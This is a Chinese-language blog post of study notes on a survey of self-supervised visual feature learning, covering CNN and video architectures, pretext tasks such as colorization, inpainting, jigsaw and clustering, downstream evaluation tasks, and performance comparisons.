<h4 id="2-3-弱监督学习"><a href="#2-3-弱监督学习" class="headerlink" title="2.3 弱监督学习"></a>2.3 弱监督学习</h4><p>弱监督学习的损失函数如下：<br>

$$
\operatorname{loss}(D)=\min _{\theta} \frac{1}{N} \sum_{i=1}^{N} \operatorname{loss}\left(X_{i}, C_{i}\right)
$$

<br>$C_i$为数据$X_i$粗粒度的标签。</p>
<p>粗粒度标签获取的成本要大大低于细粒度，因此相对容易获得大规模数据集。近年来，在某些方面也取得了不错的性能。$^{[21][22]}$</p>
<h4 id="2-4-无监督学习"><a href="#2-4-无监督学习" class="headerlink" title="2.4 无监督学习"></a>2.4 无监督学习</h4><p>无监督学习即指学习过程不需要任何人工注释的标签，其中包括完全无监督学习（不需要任何标签）以及自监督学习（利用自动生成的伪标签进行训练）。</p>
<h5 id="2-4-1-自监督学习"><a href="#2-4-1-自监督学习" class="headerlink" title="2.4.1 自监督学习"></a>2.4.1 自监督学习</h5><p>近年来，已经出现了许多用于视觉特征学习的自监督学习方法$^{[23]-[35]}$。</p>
<p>与监督学习相似的地方是：自监督学习也需要$X_i$~$P_i$的的数据对进行训练，不过这里的$P_i$并不是监督学习里通过人工注释的到的标签，而是完成 pretext task 而自动生成的伪标签。</p>
<p>给定一组数据集$D={P_i}^N_{i=0}$，其训练损失函数定义为：<br>

$$
\operatorname{loss}(D)=\min _{\theta} \frac{1}{N} \sum_{i=1}^{N} \operatorname{loss}\left(X_{i}, P_{i}\right)
$$

</p>
<p>只要伪标签$P_i$不是由人工标注的，那么就属于自监督学习。</p>
<h2 id="3-常见的深度网络架构"><a href="#3-常见的深度网络架构" class="headerlink" title="3 常见的深度网络架构"></a>3 常见的深度网络架构</h2><p>该节主要介绍了用于学习图像和视频特征的常见架构，对于不同的学习方法来说，架构大致是相同的</p>
<h4 id="3-1-学习图像特征的架构"><a href="#3-1-学习图像特征的架构" class="headerlink" title="3.1 学习图像特征的架构"></a>3.1 学习图像特征的架构</h4><p>主要介绍 AlexNet$^{[8]}$、VGG$^{[9]}$、GooLeNet$^{[10]}$、ResNet$^{[11]}$ 和 DenseNet$^{[12]}$ 五种图像特征学习架构。</p>
<h5 id="3-1-1-AlexNet"><a href="#3-1-1-AlexNet" class="headerlink" title="3.1.1 AlexNet"></a>3.1.1 AlexNet</h5><p><a href="https://my.oschina.net/u/876354/blog/1620906" target="_blank" rel="noopener">https://my.oschina.net/u/876354/blog/1620906</a></p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001093802276.png" alt="image-20201001093802276"></p>
<p>6240万个参数的AlexNet在ImageNet上训练了130万张图片。AlexNet具有8层，其中5层为卷积层，3层为全连接层，ReLU应用在每个卷积层之后。94%的参数来自全连接层，很容易过拟合，因此可通过数据扩充、数据丢失和正则化来避免。</p>
<h5 id="3-1-2-VGG"><a href="#3-1-2-VGG" class="headerlink" title="3.1.2 VGG"></a>3.1.2 VGG</h5><p>详细参考：<a href="https://my.oschina.net/u/876354/blog/1634322" target="_blank" rel="noopener">https://my.oschina.net/u/876354/blog/1634322</a></p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001094956564.png" alt="image-20201001094956564"></p>
<p>VGG具有16个卷积层，分别属于5个卷积块。其与AlexNet不同的是，AlexNet具有大的卷积步幅和内核大小，但是VGG中的所有卷积核都有相同的小尺寸（3×3）和小的卷积步幅（1×1）。</p>
<p>较大的内核大小会导致过多的参数和较大的模型大小，而较大的卷积步幅会导致网络在较低层丢失一些精细的功能。</p>
<h5 id="3-1-3-ResNet"><a href="#3-1-3-ResNet" class="headerlink" title="3.1.3 ResNet"></a>3.1.3 ResNet</h5><p>详细参考：<a href="https://zhuanlan.zhihu.com/p/31852747" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31852747</a></p>
<p>VGG证明了更深的网络具有更好的性能，但是难以训练（梯度消失、梯度爆炸）。</p>
<p>残差网络ResNet通过使用条约连接（skip connection），将前一个特征图发送到下一个卷积来在卷积快中使用来客服梯度消失和梯度爆炸。</p>
<p>skip connections中文为<strong>跳跃连接</strong>，通常用于残差网络中，作用是在比较深的网络中，解决在训练的过程中<strong>梯度爆炸</strong>和<strong>梯度消失</strong>问题。</p>
<p>参考：<a href="https://cloud.tencent.com/developer/news/134921" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/134921</a></p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001102526359.png" alt="image-20201001102526359"></p>
<h5 id="3-1-4-GoogLeNet"><a href="#3-1-4-GoogLeNet" class="headerlink" title="3.1.4 GoogLeNet"></a>3.1.4 GoogLeNet</h5><p>详细参考：<a href="https://my.oschina.net/u/876354/blog/1637819" target="_blank" rel="noopener">https://my.oschina.net/u/876354/blog/1637819</a></p>
<p>GoogLeNet 是一个22层的深度网络，基本块是七十块，它由4个具有不同内核大小的并行卷积层组成，然后是1×1卷积来降维。</p>
<p>GoogLeNet在计算成本不变的情况下增加了网络的深度和宽度，结构如下：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001122734534.png" alt="image-20201001122734534"></p>
<h5 id="3-1-5-DenseNet"><a href="#3-1-5-DenseNet" class="headerlink" title="3.1.5 DenseNet"></a>3.1.5 DenseNet</h5><p>详细参考：<a href="https://zhuanlan.zhihu.com/p/37189203" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37189203</a></p>
<p>为了减轻深层网络中深层难以记住网络的低级功能的问题，提出了密集连接，将卷积块之前的所有特征作为神经网络中下一个卷积块的输入发送，这样所有先前的卷积块的输出特征都用作当前块的输入。这样，较浅的块可以专注于低级功能，而较深的块专注于高级任务特定功能。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001123650760.png" alt="image-20201001123650760"></p>
<h4 id="3-2-学习视频特征的架构"><a href="#3-2-学习视频特征的架构" class="headerlink" title="3.2 学习视频特征的架构"></a>3.2 学习视频特征的架构</h4><ul>
<li>基于2DConvNet的方法在每个单帧上应用2DConvNet，并将多个帧的图像特征融合为视频特征。</li>
<li>基于3DConvNet的方法采用3D卷积运算从多个帧中同时提取空间和时间特征。</li>
<li>基于LSTM的方法采用LSTM对视频中的长期动态进行建模。</li>
</ul>
<h5 id="3-2-1-Two-Stream-Network（双流网络）"><a href="#3-2-1-Two-Stream-Network（双流网络）" class="headerlink" title="3.2.1 Two-Stream Network（双流网络）"></a>3.2.1 Two-Stream Network（双流网络）</h5><p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001144423636.png" alt="image-20201001144423636"></p>
<p>用一个2DConvNet捕获RGB流中的空间特征，用另一个2DConvNet捕获光流中的时间特征。实验表面，两种流的融合可以显著提高动作识别的准确性，后来这项工作已经扩展到多流网络，以融合不同类型输入的特征。</p>
<h5 id="3-2-2-Spatiotemporal-Convolutional-Neural-Network（时空卷积神经网络）"><a href="#3-2-2-Spatiotemporal-Convolutional-Neural-Network（时空卷积神经网络）" class="headerlink" title="3.2.2  Spatiotemporal Convolutional Neural Network（时空卷积神经网络）"></a>3.2.2  Spatiotemporal Convolutional Neural Network（时空卷积神经网络）</h5><p>3DConvNets能够同时从多个帧中提取空间和时间特征。</p>
<p>C3D是一个类似VGG的11层的3DConvNet，其中8个卷积层，3个全连接层，所有核的大小为3×3×3，卷积步幅固定为1个像素。</p>
<p>LTC（long-term temporal convolutions）任务C3D从16个连续RGB帧中提取外观和时间，不足以表示持续时间更长的整个动作。因此采用了大量的帧训练3DConvNets并取得了由于C3D的性能。</p>
<p>由于3D卷积对视频分析任务的成果，已经提出了各种3DConvNet的体系结构。提出了一种通过3D卷积层替换ResNet中的所有2D卷积层，提出了3DResNet。</p>
<h5 id="3-2-3-Recurrent-Neural-Network（递归神经网络，RNN）"><a href="#3-2-3-Recurrent-Neural-Network（递归神经网络，RNN）" class="headerlink" title="3.2.3 Recurrent Neural Network（递归神经网络，RNN）"></a>3.2.3 Recurrent Neural Network（递归神经网络，RNN）</h5><p>由于能够对序列中的时间动态建模，RNN经常作为有序帧序列应用于视频。</p>
<p>LSTM使用存储单元来存储、修改和访问内部状态，可以更好的对长期时间关系建模。$^{[73]}$</p>
<p>基于LSTM提出的用于人类动作识别的长期递归卷积网络（LRCN，long-term recurrent convolutional networks）框架如下:$^{[54]}$</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001161322468.png" alt="image-20201001161322468"></p>
<p>将LSTM顺序的应用于ConvNets提取的特征，以模拟帧序列中的时间动态。使用LSTM将视频建模为帧序列，能显式地对视频中的长期时间动态建模。</p>
<h4 id="3-3-ConvNet-架构的总结"><a href="#3-3-ConvNet-架构的总结" class="headerlink" title="3.3 ConvNet 架构的总结"></a>3.3 ConvNet 架构的总结</h4><p>深度卷积网络已经在各种计算机视觉任务中表现得很好，但是一个常见是这些网络在数据稀缺的情况下通常由数百万个参数，从而导致数百万个参数。</p>
<p>在大数据集上进行预训练并在小数据集上进行微调，无论是性能和效率上都要优于在小规模数据集从头开始训练，但是大规模数据集的收集和注释仍然是一个代价很大的过程。因此提出了许多子监督学习办法，之后的部分介绍了针对图像和视频特征的自监督学习的一般流程。</p>
<h2 id="4-常见的前置任务和下游任务"><a href="#4-常见的前置任务和下游任务" class="headerlink" title="4 常见的前置任务和下游任务"></a>4 常见的前置任务和下游任务</h2><p>大多数自监督学习的方法都遵循下图的模式：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001203218066.png" alt="image-20201001203218066"></p>
<p>为ConvNets定义一个预任务，通过解决该预任务来学习到视觉特征，并自动生成伪标签$P$，而无需人工注释。通过最小化ConvNet的预测$O$和伪标签$P$的误差来优化ConvNet，这样在完成前置任务后就得到了能捕获图像或视频视觉特征的ConvNet模型。</p>
<h4 id="4-1-从前置任务中学习视觉特征"><a href="#4-1-从前置任务中学习视觉特征" class="headerlink" title="4.1 从前置任务中学习视觉特征"></a>4.1 从前置任务中学习视觉特征</h4><p>目前已经有许多前置任务应用于自监督学习，如前景对象分割（foreground object segmentation）$^{[81]}$、图像修复（image inpainting）$^{[19]}$、聚类（clustering）$^{[44]}$、图像着色（image colorization）$^{[82]}$、时间序列验证（temporal order verification）$^{[44]}$、视频音频对应验证（visual audio correspondence verification）$^{[25]}$。</p>
<p>以图像着色为例子，该任务即需要将灰度图着色为彩色图。在着色的过程中，只有网络学习到了图像的结构和上下文信息，才能生成逼真的彩色图像。</p>
<h4 id="4-2-常用的前置任务"><a href="#4-2-常用的前置任务" class="headerlink" title="4.2 常用的前置任务"></a>4.2 常用的前置任务</h4><p>通常，自监督学习的前置任务可以分为四类：</p>
<p><strong>（1）Generation-based Methods（基于生成的）</strong></p>
<ul>
<li><strong>Image Generation（图像生成）：</strong>图像着色、图像超分辨率（指由一幅低分辨率图像或图像序列恢复出高分辨率图像）、图像修复、用GANs生成图像</li>
<li>Video Generation（视频生成）：利用GANs进行视频的生成及预测</li>
</ul>
<p><strong>（2）Context-based pretext tasks（基于上下文的）</strong></p>
<ul>
<li><strong>Context Similarity（上下文相似度）：</strong>根据图像补丁之间的上下文相似性设计前置任务，包括基于图像聚类的方法（image clustering-based methods）和基于图像约束的方法（ graph constraint-based methods）。</li>
<li><strong>Spatial Context Structure（空间上下文结构）：</strong>基于图像补丁之间的空间关系，包括图像拼图（image jigsaw puzzle）、上下文预测（context prediction）、几何变换识别（geometric transformation recognition）。</li>
<li><strong>Temporal Context Structure（时间上下文结构）：</strong>来自视频的时间顺序用作监视信号。对ConvNet进行训练，以验证输入帧序列是否以正确的顺寻或识别帧序列的顺序。</li>
</ul>
<p><strong>（3）Free semantic label-based（基于自动生成语义标签的方法）</strong></p>
<p>使用自动生成的语义标签来训练网络，标签是由传统的硬编码算法或游戏引擎生成的。包括运动对象分割（moving object segmentation）、轮廓检测（contour detection）、相对深度预测（relative depth prediction）。</p>
<p><strong>（4）Cross modal-based（基于跨模态的方法）</strong></p>
<p>这种前置任务训练ConvNet验证两个不同的输入数据通道是否彼此对应。包括视觉-音频对应验证（Visual-Audio Correspondence Verification）、RGB流对应验证（RGB-Flow Correspondence Verification）、自我感应（egomotion）。</p>
<p>上面四类如下图所示：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201001211847574.png" alt="image-20201001211847574"></p>
<h4 id="4-3-常用的下游评估任务"><a href="#4-3-常用的下游评估任务" class="headerlink" title="4.3 常用的下游评估任务"></a>4.3 常用的下游评估任务</h4><p>为了评估通过自监督方法学习方法学习到的的图像或视频特征的质量，将学习到参数用作预训练模型，然后对下游高级任务进行微调，这种迁移学习的能力可以证明所学特征的泛化能力。</p>
<p>常见的下游高级视觉任务有：</p>
<ul>
<li><strong>Semantic Segmentation（语义分割）</strong>：为图像中每个像素分配语义标签的任务。</li>
<li><strong>Object Detection（目标检测）</strong>：在图像中定位目标位置别识别其类别的任务。</li>
<li><strong>Image Classification（图像分类）</strong>：识别每个图像中对象类别的任务，通常每个图像只能使用一个类别标签。将自监督学习模型应用于每个图象上来提取特征，然后用这些特征训练一个分类器（如SVM），将分类器在测试集上的表现与自监督模型进行比较，来评估所学特征的质量。</li>
<li><strong>Human Action Recognition（人体行为识别）</strong>：识别视频中的人们在做什么，以获取预定义动作类别的列表。通常用于从视频中学习到的特征的质量。</li>
</ul>
<p>除了以上对所学特征进行定量的评估之外，还有一些定性可视化的方法对自监督学习的特征进行评估（Qualitative Evaluation）：</p>
<ul>
<li><strong>Kernel Visualization：</strong>定性的可视化通过前置任务学习的第一个卷积层的内核，并比较监督模型的内核。通过比较监督学习模型和自监督学习模型内核的相似性，来评估其有效性。</li>
<li><p><strong>Feature Map Visualization：</strong>可视化特征图来显示网络的关注区域，较大的激活表示神经网络更关注图像中的相应区域，通常对特征图进行定性可视化，并与监督模型进行比较。</p>
</li>
<li><p><strong>Nearest Neighbor Retrieval：</strong>通常具有相似外观的图像在特征空间中更靠近。最近邻方法用于从自监督学习模型学习的特征的特征空间中找到前K个最近的邻居。</p>
</li>
</ul>
<h2 id="5-数据集"><a href="#5-数据集" class="headerlink" title="5 数据集"></a>5 数据集</h2><p>自监督学习不需要人工标注的数据，因此任何监督学习的数据集都可以用来自监督方式的视觉特征学习。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201002162138051.png" alt="image-20201002162138051"></p>
<h2 id="6-图像特征的学习"><a href="#6-图像特征的学习" class="headerlink" title="6 图像特征的学习"></a>6 图像特征的学习</h2><h4 id="6-1-基于生成（Generation-based）"><a href="#6-1-基于生成（Generation-based）" class="headerlink" title="6.1 基于生成（Generation-based）"></a>6.1 基于生成（Generation-based）</h4><p><strong>（1）Image Generation with GAN</strong></p>
<p>GAN通常用来生成逼真的图像，有一个生成器（generator）和一个判别器（discriminator）判别器为了能够区分真实图像与生成数据图像分布的区别，就需要捕获图像中的语义特征来完成任务，因此就可以将判别器的参数应用于下游视觉任务。但是此类生成图像任务主要目的是生成逼真的图像，而不是在下游任务获得更好的性能。</p>
<p>对抗训练（adversarial training）可以帮助网络捕获真实数据的真实分布并生成真实数据，当没有人工注释的标签涉及时，也属于自监督学习。</p>
<p><strong>（2）Image Inpainting</strong></p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201002173133776.png" alt="image-20201002173133776"></p>
<p>图像修补（Image Inpainting）是根据图像的其余部分预测任意缺失区域的任务，只有模型真正读懂了这张图所代表的含义，学习到了图像的特征（颜色、结构等），才能有效的修补缺失的区域。$^{[19]}$</p>
<p>一般是由生成器和判别器两个网络进行对抗从而预测缺失部分，为了完成图像修复任务，两个网络都需要学习图像的语义特征：</p>
<ul>
<li>生成网络分为编码器和解码器两部分：编码器的输入是需要修复的图像，上下文编码器学习图像的语义特征。上下文解码器将基于此特征预测丢失的区域。因此就要求生成器了解图像的内容，以便生成合理的假设。</li>
<li>判别网络经过训练可以区分输入图像是否是生成器的输出。</li>
</ul>
<p><strong>（3）Image Super Resolution</strong></p>
<p>图像超分辨率（Image super-resolution）是增强图像分辨率的任务，从低分辨率图像中生成高分辨率图像。Ledig等人提出了用于单一图像超分辨率的生成对抗网络SRGAN$^{[15]}$。</p>
<ul>
<li>生成网络：增强输入的低分辨率图像的分辨率。</li>
<li>判别网络：判别生成的图像与原始的高分辨率的图像的相似性。</li>
</ul>
<p>和其他GAN相似，判别网络学到的参数可以迁移到其他下游任务上，但是目前还没有人测试这个迁移学习的性能如何。</p>
<p><strong>（4）Image Colorization</strong></p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201002191222250.png" alt="image-20201002191222250"></p>
<p>图像着色（Image Colorization）将灰度图片作为输入，网络需要正确的为图片进行着色，为了使每个像素正确着色，网络就需要识别对象并将统一部分的像素分组在一起，从而在该过程中学习了图像的视觉特征。</p>
<p>最近几年，研究人员提出了许多基于图像着色的方法$^{[18][137][138]}$，并且有一些工作专门使用图像着色作为自监督图像表征学习的前置任务。</p>
<h4 id="6-2-基于上下文（Context-Based）"><a href="#6-2-基于上下文（Context-Based）" class="headerlink" title="6.2 基于上下文（Context-Based）"></a>6.2 基于上下文（Context-Based）</h4><p><strong>（1）Context Similarity</strong></p>
<p>基于上下文相似性进行学习（Learning with Context Similarity），这里指的是在自监督学习中使用聚类算法。基于传统的提取特征的方法（e.g. Hog, SIFT)将图像聚类，然后基于聚类后的伪标签进行训练，让ConvNET对数据进行分类（或识别两个图像是否来自同一个类）。为了能够完成该分类任务，ConvNet就需要学习每个类别之间的相似性和不同类别之间的差异性。</p>
<p>下图为DeepCluster的架构，用K-Means对图像迭代的进行聚类，然后用后续的聚类伪标签监督的更新ConvNet的权重。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003113900613.png" alt="image-20201003113900613"></p>
<p>Contrasting（基于对比的）：中心思想是训练一个网络使其可以最大化来自同一图片的相似性，最小化来自不同图片的相似性。值得一提的是SimCLR，这个方法在ImageNet上比其他自监督的方法精度高。</p>
<p><strong>（2）Spatial Context Structure</strong></p>
<p>利用图像包含的丰富的空间上下文信息来设计前置任务，例如图像中不同块之间的相对位置。</p>
<ul>
<li><p><strong>Image Jigsaw Puzzle$^{[20]}$：</strong>将图像切块，随机打乱，训练网络重新复原该图像。该方法的关键在于，找到一个合适的任务，让任务不会太过简单（达不到训练预期效果），也不会太难（训练无法收敛）。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003142716169.png" alt="image-20201003142716169"></p>
</li>
<li><p><strong>Geometric Transformation$^{[28]}$：</strong>将原图旋转一定角度，让网络预测出图像的旋转角度。</p>
</li>
</ul>
<h4 id="6-3-基于自动生成语义标签（Free-Semantic-Label-based）"><a href="#6-3-基于自动生成语义标签（Free-Semantic-Label-based）" class="headerlink" title="6.3 基于自动生成语义标签（Free Semantic Label-based）"></a>6.3 基于自动生成语义标签（Free Semantic Label-based）</h4><p>通过Game Engine或Hard-code自动生成语义标签（如segmentation masks、depth images、optic flows、surface normal images），因为这些语义标签不需要任何人工注释，因此可以使用合成数据集与无标记大型数据集结合使用进行自监督学习。</p>
<p><strong>（1）Labels Generated by Game Engines</strong></p>
<p>Game Engine可以渲染逼真的图像比提供精确的像素级标签，并且可以低成本合成大规模数据集。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003145210867.png" alt="image-20201003145210867"></p>
<p>虽然可以利用自动生产的语义标签进行学习，但是毕竟合成的图像与真实图像学习到的视觉特征还是有区别的。因此，Ren和Lee提出了一种基于对抗学习的无监督特征空间域自适应方法$^{[30]}$（这里可以理解为自监督）：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003145458613.png" alt="image-20201003145458613"></p>
<p>该方法使用了一个鉴别器$D$进行对抗训练，来不断最小化真实图像和合成图像直接特征空间域的差异，这样就可以在合成图像的语义标签训练下，更好的捕获真实图像的视觉特征。</p>
<p><strong>优点：</strong>与其他的让网络隐式的学习视觉特征不同，此种方法直接利用了合成图像自动生成的精确语义标签进行训练，使得网络学习与图像中对象高度相关的特征。</p>
<p><strong>（2）Labels Generated by Hard-code programs</strong></p>
<p>通过在图像或视频上使用硬编码程序（Hard-code program）来获取语义标签，使用生成的标签训练ConvNet。</p>
<p>优点是可以用语义标签作为监督信号，驱使ConvNet直接学习语义特征；确定是硬编码检测器生成的语义标签容易引入噪音，需要专门处理。</p>
<h4 id="6-4-总结"><a href="#6-4-总结" class="headerlink" title="6.4 总结"></a>6.4 总结</h4><p>用于图像的自监督学习前置任务总结：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201002162758472.png" alt="image-20201002162758472"></p>
<h2 id="7-视频特征的学习"><a href="#7-视频特征的学习" class="headerlink" title="7 视频特征的学习"></a>7 视频特征的学习</h2><h4 id="7-1-基于生成（Generation-based）"><a href="#7-1-基于生成（Generation-based）" class="headerlink" title="7.1 基于生成（Generation-based）"></a>7.1 基于生成（Generation-based）</h4><p><strong>（1）Video Generation with GAN</strong></p>
<p>与图像类生成方法类似，通常由两部分组成：Generator（生成器：生成视频）和Discriminator（判别器：区分生成的与真实的视频），Discriminator为解决判别任务需要学习视频中到相应的语义特征，然后其中的参数可以被迁移到其他下游任务。</p>
<ul>
<li><strong>VideoGAN</strong>$^{[85]}$：利用双流网络的思想，一条流将视频中的静态区域建模为背景，另一条流将视频中的移动对象建模为前景，视频由前景流和背景流组合生成。</li>
<li><strong>MocoGAN</strong>$^{[86]}$：用两个子空间的组合来表示视频，一个空间为上下文空间（该空间的每一个变量代表一个身份），另一个空间为运动空间（该空间中的轨迹代表身份的运动）</li>
</ul>
<p><strong>（2）Video Colorization</strong></p>
<p>视频上色（Video Colorization）是将灰度帧着色为彩色帧的任务。给定参考的RGB帧和灰度图像，网络需要学习它们之间的内部连接才能成果上色$^{[145]}$。</p>
<p>考虑视频中时间连贯性（指短时间内的连续帧具有相似的连贯性外观）的思想，利用颜色一致性（color coherence）来作为监督信号，但是这方面的研究还较少。</p>
<p><strong>（3）Video Prediction</strong></p>
<p>视频预测（Video Prediction）是基于有限的视频帧来预测未来帧序列的任务，为了预测未来的帧，网络就必须学习到给定帧中外观的变化，因此可以利用这些视频预测的方法进行自监督学习。</p>
<p>通常视频预测框架分为编码器和解码器：</p>
<ul>
<li>编码器：根据给定视频帧对空间和时间进行建模。</li>
<li>解码器：根据编码器提取的特征预测未来的帧。</li>
</ul>
<p>目前，研究视频预测所学特征的泛化能力如何的工作还较少。</p>
<h4 id="7-2-基于时序（Temporal-Context-based）"><a href="#7-2-基于时序（Temporal-Context-based）" class="headerlink" title="7.2 基于时序（Temporal Context-based）"></a>7.2 基于时序（Temporal Context-based）</h4><ul>
<li><p>Temporal Order Verification：输入一段视频序列，模型需要判断视频的序列是否是正确的序列$^{[40]}$。</p>
</li>
<li><p>Temporal Order Recognition：输入一段视频序列，模型需要给出视频的正确序列。</p>
</li>
</ul>
<p>这些方法的通常会经历大量的数据准备步骤；训练网络使用的视频序列是根据光流（Optical Flow的解释可看：<a href="https://zhuanlan.zhihu.com/p/44859953）量决定的，光流计算是昂贵且慢的。" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44859953）量决定的，光流计算是昂贵且慢的。</a></p>
<h4 id="7-3-基于跨模态（Cross-Modal-based）"><a href="#7-3-基于跨模态（Cross-Modal-based）" class="headerlink" title="7.3 基于跨模态（Cross Modal-based）"></a>7.3 基于跨模态（Cross Modal-based）</h4><p>基于跨模态的学习方法通常从多个数据流的对应关系中学习视频的特征，包括RGB帧序列（RGB frame sequence）、光流序列（optical flow sequence）、音频数据（audio data）、摄像机姿态（camera pose）。训练网络以识别两种输入数据是否彼此对应，或者训练网络以学习不同模态之间的转换。</p>
<p><strong>（1）RGB-Flow Correspondence</strong></p>
<p>验证输入的RGB帧和光流是否彼此对应来学习视频特征$^{[23],[24]}$。</p>
<p><strong>（2）Visual-Audio Correspondence</strong></p>
<p>利用视频和音频对应关系学习特征的方法$^{[25],[93]}$。</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003185359746.png" alt="image-20201003185359746"></p>
<p>通过从一个视频的同一时间提取视频帧和音频来采样正数据，而通过从不同的视频或一个视频的不同时间提取视频帧和音频来生成负训练数据。训练网络以发现视频数据和音频数据的相关性以完成此任务。</p>
<p><strong>（3）Ego-motion</strong></p>
<p>利用以自我为中心的视频和自我运动信号$^{[94],[95]}$之间的对应关系进行学习。</p>
<p>参考链接：<a href="https://blog.csdn.net/cserwangjun/article/details/103154308" target="_blank" rel="noopener">https://blog.csdn.net/cserwangjun/article/details/103154308</a></p>
<h4 id="7-4-总结"><a href="#7-4-总结" class="headerlink" title="7.4 总结"></a>7.4 总结</h4><p>用于视频的自监督学习前置任务总结：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003154431844.png" alt="image-20201003154431844"></p>
<h2 id="8-性能比较"><a href="#8-性能比较" class="headerlink" title="8 性能比较"></a>8 性能比较</h2><h4 id="8-1-学习图像特征的性能"><a href="#8-1-学习图像特征的性能" class="headerlink" title="8.1 学习图像特征的性能"></a>8.1 学习图像特征的性能</h4><p>使用来自AlexNet的卷积层的激活作为特征对ImageNet和Places数据集进行线性分类，其中“Places labels ”和“ImageNet labels ”两行为具有人工注释标签的监督学习，结果如下，</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003210614656.png" alt="image-20201003210614656"></p>
<ul>
<li>自监督学习的性能总是由于从头训练（第二栏第一行）。</li>
<li>所有自监督方法都在conv3和conv4表现较好，可能因为浅层捕获了一般的低级特征，而深层捕获了与预任务相关的特征。</li>
<li>当用于训练预任务的数据集与下游任务的数据集之间存在领域差距时，自监督学习方法能够达到与使用ImageNet标签监督训练的模型相当的性能。</li>
</ul>
<p>在除了图像分类下游任务，在目标检测和语义分割的性能对比如下：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003211419837.png" alt="image-20201003211419837"></p>
<p>总体来看，<strong>DeepClustering</strong>在所有自监督学习方法中表现最好。</p>
<h4 id="8-2-学习视频特征的性能"><a href="#8-2-学习视频特征的性能" class="headerlink" title="8.2 学习视频特征的性能"></a>8.2 学习视频特征的性能</h4><p>比较现有的自我监督方法在UCF101和HMDB51数据集上的动作识别性能，Kinetics Label表示人工注释标签的监督学的性能：</p>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20201003211633068.png" alt="image-20201003211633068"></p>
<h2 id="9-展望"><a href="#9-展望" class="headerlink" title="9 展望"></a>9 展望</h2><p><strong>（1）Learning Features from Synthetic Data（从合成的数据中学习）</strong></p>
<ul>
<li><p>利用合成数据来练网络，因为通过游戏引擎生成的图像和视频可以自动生成精确的注释，从而利用预任务从合成数据中学习特征具有较好的效果。</p>
</li>
<li><p>现存问题：如何弥合合成数据和真实数据之间的领域鸿沟。</p>
</li>
</ul>
<p><strong>（2）Learning from Web Data（从网络数据中学习）</strong></p>
<ul>
<li>利用网络收集的数据$^{[22],[167],[168]}$，并基于它们现有的关联标签来训练网络。通过大规模Web数据及其关联的元数据，可以提高自我监督方法的性能</li>
<li>现存问题：如何处理Web数据及其关联的元数据中的噪声。</li>
</ul>
<p><strong>（3）Learning Spatiotemporal Features from Videos（从视频中学习时空特征的性能）</strong></p>
<ul>
<li>自监督学习的图像特征已经具有不错的效果，但是视频特征（尤其是3DConvNet）的自监督学习效果不是很好，还有待新的自监督方法来提高性能。</li>
</ul>
<p><strong>（4）Learning with Data from Different Sensors（从不同传感器的数据中学习）</strong></p>
<ul>
<li>目前的研究关注的主要是视频和图像，但是如果可以使用来自不同模态的其他类型数据，则可以将不同数据类型直接的对应或约束关系应用于网络的训练$^{[155]}$。</li>
<li>通过自动驾驶汽车可以很容易获得多种传感器的数据集，如RGB摄像机、灰度摄像机、3D激光扫描仪、高精度GPS测量和IMU加速等。</li>
</ul>
<p><strong>（5）Learning with Multiple Pretext Tasks（使用多个预任务进行学习）</strong></p>
<ul>
<li>现有的大多数自监督学习都是训练网络解决某一个Pretext task，很少研究探索是否使用多个预任务进行训练会有更好的性能$^{[30],[32]}$。</li>
</ul>
